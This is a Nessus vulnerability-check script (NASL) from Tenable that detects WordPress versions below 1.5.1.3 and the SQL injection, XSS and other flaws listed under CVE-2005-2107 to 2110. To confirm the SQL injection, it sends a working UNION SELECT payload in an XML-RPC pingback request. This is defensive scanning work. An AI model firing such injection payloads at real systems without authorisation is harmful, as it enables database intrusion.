#
# (C) Tenable Network Security
#

include("compat.inc");

if (description) {
  script_id(18601);
  script_version("$Revision: 1.15 $");

  script_cve_id(
    "CVE-2005-2107",
    "CVE-2005-2108",
    "CVE-2005-2109",
    "CVE-2005-2110"
  );
  script_xref(name:"OSVDB", value:"17636");

  name["english"] = "WordPress < 1.5.1.3 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
various issues." );
 script_set_attribute(attribute:"description", value:
"The version of WordPress installed on the remote host is prone to
several vulnerabilities :

  - A SQL Injection Vulnerability
    The bundled XML-RPC library fails to sanitize user-supplied 
    input to the 'xmlrpc.php' script. An attacker can exploit
    this flaw to launch SQL injection attacks which may lead to
    disclosure of the administrator's password hash, attacks
    against the underlying database, and the like.

  - Multiple Cross-Site Scripting Vulnerabilities
    An attacker can pass arbitrary HTML and script code through
    the 'p' and 'comment' parameters of the 'wp-admin/post.php'
    script, which could result in disclosure of administrative
    session cookies.

  - Lost Password Security Issue
    The application fails to initialize the variable 'message'
    in 'wp_login.php' when notifying a user about a lost
    password. If PHP's 'register_globals' setting is enabled,
    an attacker can exploit this flaw to insert his own 
    text before the stock message from WordPress.

  - Path Disclosure Vulnerabilities
    By calling several scripts directly, an attacker can learn
    the application's full installation path." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00085-06282005" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WordPress version 1.5.1.3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in WordPress < 1.5.1.2";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Check whether the script exists.
  r = http_send_recv3(method: "GET", item:string(dir, "/xmlrpc.php"), port:port);
  if (isnull(r)) exit(0);

  # If it does...
  if ("XML-RPC server accepts POST requests only" >< r[2]) {
    # Find an existing post.
    res = http_get_cache(item:string(dir, "/index.php"), port:port);
    if (res == NULL) exit(0);

    pat = '/\\?p=([0-9]+)" rel="bookmark"';
    matches = egrep(pattern:pat, string:res);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        post = eregmatch(pattern:pat, string:match);
        if (!isnull(post)) {
          post = post[1];
          # We're only interested in the first post we find.
          break;
        }
      }
    }

    # If we have a post, try to exploit the flaw.
    if (post) {
      postdata = string(
        '<?xml version="1.0"?>',
        "<methodCall>",
        "<methodName>pingback.ping</methodName>",
          "<params>",
            # nb: we can only determine success based on whether any 
            #     rows were returned. The exploit used here, while 
            #     lame, is certain to return one.
            # nb^2: this only works if the MySQL version supports 
            #       UNION (ie, >= 4.0).
            "<param><value><string>", SCRIPT_NAME, "' UNION SELECT 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--</string></value></param>",
            "<param><value><string>http://", get_host_name(), dir, "/?p=", post, "#1</string></value></param>",
            "<param><value><string>admin</string></value></param>",
          "</params>",
        "</methodCall>"
      );
      r = http_send_recv3(method: "POST", item: dir+"/xmlrpc.php", version: 11, port: port,
  add_headers: make_array("Content-Type", "text/xml"), data: postdata);
      if (isnull(r)) exit(0);

      # There's a problem if we see "The pingback has already been registered".
      if ("The pingback has already been registered" >< r[2]) {
        security_hole(port);
	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
	set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
        exit(0);
      }
    }
  }
}
